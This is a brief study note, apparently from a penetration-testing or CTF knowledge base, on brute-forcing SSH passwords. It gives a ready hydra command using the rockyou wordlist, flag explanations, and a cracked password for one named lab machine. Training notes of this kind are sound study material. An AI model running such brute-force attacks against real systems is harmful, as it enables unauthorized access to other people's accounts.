---
type: technique
tags: [ejpt:host-net-pentest]
tools: [hydra]
cves: []
related: [[sudo-abuse]]
---

# SSH Brute Force

Dictionary attack against SSH using a known (or guessed) username.

## Command

```sh
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4
```

- `-l` single user, `-L` user list; `-P` password list.
- `-t 4` limits parallel tasks to avoid SSH throttling.

## Common targets

- Root with a weak password ([[breakmyssh]] → `estrella`).
- A username leaked from web source or SMB, paired with `rockyou.txt`.

## Seen in

[[breakmyssh]], [[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[basic-pentesting]], [[simple-ctf]]
